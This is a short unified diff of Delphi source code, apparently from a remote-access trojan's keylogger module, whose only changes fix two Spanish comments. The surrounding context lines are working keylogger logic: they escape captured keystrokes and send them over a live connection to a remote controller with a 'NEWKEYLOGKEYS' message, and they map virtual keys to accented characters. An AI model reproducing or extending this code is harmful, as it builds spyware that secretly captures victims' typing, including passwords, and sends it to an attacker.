@@ -224,7 +224,7 @@ begin
           begin
             OnlineKeyloggerKeys:= StringReplace(OnlineKeyloggerKeys,#10, '|salto|', [rfReplaceAll]);   //Para que lo envie todo de una vez
             OnlineKeyloggerKeys := StringReplace(OnlineKeyloggerKeys,#13, '|salto2|', [rfReplaceAll]);
-            OnlineKeyloggerKeys := StringReplace(OnlineKeyloggerKeys,' ', '|espacio|', [rfReplaceAll]); //Para evitar el trim(
+            OnlineKeyloggerKeys := StringReplace(OnlineKeyloggerKeys,' ', '|espacio|', [rfReplaceAll]); //Para evitar el trim( final
             if(Cliente.Connected) then
               Cliente.SendString('NEWKEYLOGKEYS|'+OnlineKeyloggerKeys+ #10)
             else
@@ -292,7 +292,7 @@ begin
 
       begin
         szletta := chr((VirtKey)); //letra
-         if(szletta = 'A') then   //habria que mirar si es ´ ¨ ~... las que estan pulsadas pero bueno no creo que sea muy relevante para nuestro idioma :p
+         if(szletta = 'A') then   //habría que mirar si es ´ ¨ ~... las que estan pulsadas pero bueno no creo que sea muy relevante para nuestro idioma :p
           szletta :='á'
          else
          if(szletta = 'E') then
